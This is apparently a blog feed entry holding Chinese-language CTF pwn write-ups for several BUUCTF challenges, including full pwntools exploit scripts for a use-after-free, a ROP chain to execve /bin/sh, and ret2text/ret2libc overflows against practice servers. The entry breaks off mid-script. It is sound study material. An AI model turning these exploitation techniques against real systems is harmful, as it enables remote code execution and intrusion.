{
    "version": "https://jsonfeed.org/version/1",
    "title": "Walt's Blog • All posts by \"stack migration\" tag",
    "description": "",
    "home_page_url": "http://waltcsz.github.io",
    "items": [
        {
            "id": "http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/",
            "url": "http://waltcsz.github.io/PWN/Write-Up/buu-0910-99351e39558a/",
            "title": "buu 0910",
            "date_published": "2023-09-11T09:12:49.000Z",
            "content_html": "<h2 id=\"bjdctf_2020_router\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_router\">#</a> bjdctf_2020_router</h2>\n<p><img data-src=\"./image-20230911171316327.png\" alt=\"image-20230911171316327\"></p>\n<p>0x7ffd797d1e80 - 0x7ffd797d1fc0 = -320</p>\n<p>tcache 中的地址为与堆基址异或后的地址</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zNjUxNzA3Nzc=\">从 VNCTF2021-ff 浅析 libc2.32 下 ptmalloc 新增的防护之指针异或加密 - 知乎 (zhihu.com)</span></p>\n<h2 id=\"zjctf-2019-easyheap\"><a class=\"markdownIt-Anchor\" href=\"#zjctf-2019-easyheap\">#</a> zjctf 2019 easyheap</h2>\n<h2 id=\"picoctf_2018_buffer_overflow_1\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_1\">#</a> PicoCTF_2018_buffer_overflow_1</h2>\n<p>setegid</p>\n<p>送分</p>\n<h2 id=\"black-watch-入群题\"><a class=\"markdownIt-Anchor\" href=\"#black-watch-入群题\">#</a> black watch 入群题</h2>\n<h2 id=\"inndy_rop\"><a class=\"markdownIt-Anchor\" href=\"#inndy_rop\">#</a> inndy_rop</h2>\n<p>学了个 ROPgadget 的妙招，–ropchain 参数可以自动生成 rop 链，代码都写好了一半。</p>\n<p>其次，找 32 位 elf 的系统调用时，用–only ‘int’</p>\n<h2 id=\"hitcontraining_uaf\"><a class=\"markdownIt-Anchor\" href=\"#hitcontraining_uaf\">#</a> hitcontraining_uaf</h2>\n<p>Use after free</p>\n<p>（与 ctfwiki 的 [例题](<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\">Use After Free - CTF Wiki (ctf-wiki.org)</span>) 一致）</p>\n<p>这道题经典菜单，add，print，delete 三个选项。</p>\n<p>在 add 中，程序会进行两次 malloc，第一次 malloc 一个 8 字节的空间，存放一个打印函数的地址和第二次 malloc 的地址，以下称为头块。第二次 malloc 为实际存放内容的堆块，以下称为真实块。</p>\n<p>在 print 中，利用头块前 4 字节的打印函数的地址将真实块进行输出。</p>\n<p>在 delete 中，free 完没有清空指针，而且 add 中分配的两个堆块均会被释放。</p>\n<p>其次，notelist 上限为 5，释放堆块后不会清指针，因此只允许分配 5 次堆块。</p>\n<p>存在后门函数 magic。</p>\n<p>这题没有编辑函数，虽然有指针可以对释放后的堆块进行输出和再次释放，但不能修改。所以我原先的思路，即利用编辑函数修改 bk 指向头块输出函数地址位置，将堆块分配到其处再修改地址的方案失效。</p>\n<p>因此这题利用关键是每次同时分配和释放的两个堆块。倘若某次申请的内存大小为 8 字节，那么分配的两个堆块大小一样，便会从同一个 bin 中取出，即 0x10 的 bin。而释放时头块进入的即是 0x10 的 bin。这样我们的真实块必然会分配到已经释放的一个头块上，对其写入 magic，调用 print 对对应的堆块输出，即可跳转到后门函数。</p>\n<ul>\n<li>申请 note0，真实块 size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>\n<li>申请 note1，真实块 size 为 16（同上）</li>\n<li>释放 note0</li>\n<li>释放 note1</li>\n<li>此时，0x20 的 fastbin chunk 中链表为 note1-&gt;note0, 0x10 的 fastbin chunk 中链表为 note1_head -&gt; note0_head</li>\n<li>申请 note2，并且设置真实块 content 的大小为 8，那么根据堆的分配规则</li>\n<li>note2_head 其实会分配 note1_head。</li>\n<li>note2 对应的 chunk 其实是 note0_head。</li>\n</ul>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28447</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./hacknote')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x08048A75')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x08048945</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Note size :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"jarvisoj_test_your_memory\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_test_your_memory\">#</a> jarvisoj_test_your_memory</h2>\n<h2 id=\"cmcc_simplerop\"><a class=\"markdownIt-Anchor\" href=\"#cmcc_simplerop\">#</a> cmcc_simplerop</h2>\n<p>ropchain</p>\n<p>这题用 ROPgadget 秒解，但是需要进行修改，因为只能输入 100 个字符。</p>\n<p>没有遇 ‘\\0’ 截断的函数，所以可以把数字输入全部换成 pop 的形式。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> pack</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>r<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29465</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#r=process('./simplerop')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'/bin'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e82a</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; ret</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080ea064</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># @ .data + 4</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">+=</span> <span class=\"token string\">b'//sh'</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0809a15d</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># mov dword ptr [edx], eax ; ret</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0806e850</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop edx ; pop ecx ; pop ebx ; ret</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x080ea060</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080bae06</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># pop eax ; ret</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0xb</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p <span class=\"token operator\">+=</span> pack<span class=\"token punctuation\">(</span><span class=\"token string\">'&lt;I'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x080493e1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># int 0x80</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"picoctf_2018_buffer_overflow_2\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_2\">#</a> PicoCTF_2018_buffer_overflow_2</h2>\n<p>ret2text</p>\n<p>需要注意后门函数两个参数必须为指定值才能输出 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29816</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./PicoCTF_2018_buffer_overflow_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token number\">0x0080485CB</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main <span class=\"token operator\">=</span> <span class=\"token number\">0x0804866D</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x06c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADBEEF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0DEADC0DE</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter your string: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"wustctf2020_getshell_2\"><a class=\"markdownIt-Anchor\" href=\"#wustctf2020_getshell_2\">#</a> wustctf2020_getshell_2</h2>\n<p>ret2text</p>\n<p>这题的栈溢出只能溢出一个返回地址加 4 字节，所以如果按以往的方法只能放一个 gadget 和其返回地址。但如果用含 call 的汇编指令，返回地址由程序按正常方式放入，就可以做到放一个 gadget 和一个参数了。</p>\n<p>这题的字符串是一串乱码，但结尾是 sh，所以可以直接取 sh 的地址作 system 的参数。</p>\n<p><img data-src=\"./image-20230914211535334.png\" alt=\"image-20230914211535334\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sh <span class=\"token operator\">=</span> <span class=\"token number\">0x08048670</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\\\_\\\\ \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ps: 我有个神奇的思路，这道题没有开地址随机化，因此 libc 地址固定的，所以可以两次启动程序，第一次利用 call _puts 先泄露基地址然后找到 libc 中的 /bin/sh 字符串的地址，在第二次启动中使用。</p>\n<p>但是本地打通了，远程没成功。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27939</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell_2')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b puts')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./wustctf2020_getshell_2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_call <span class=\"token operator\">=</span> <span class=\"token number\">0x08048577</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>payload = b'a'*offset + p32(puts_call) + p32(lsm_g)</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>print('length: %x'%len(payload))</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p.recvuntil(b'\\\\_\\\\ \\n\\n')</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p.sendline(payload)</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lsm_a = u32(p.recv(4))</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p.close()</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p=remote('node4.buuoj.cn',27939)</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> <span class=\"token number\">0xf7df2540</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sys <span class=\"token operator\">=</span> <span class=\"token number\">0x8048529</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token 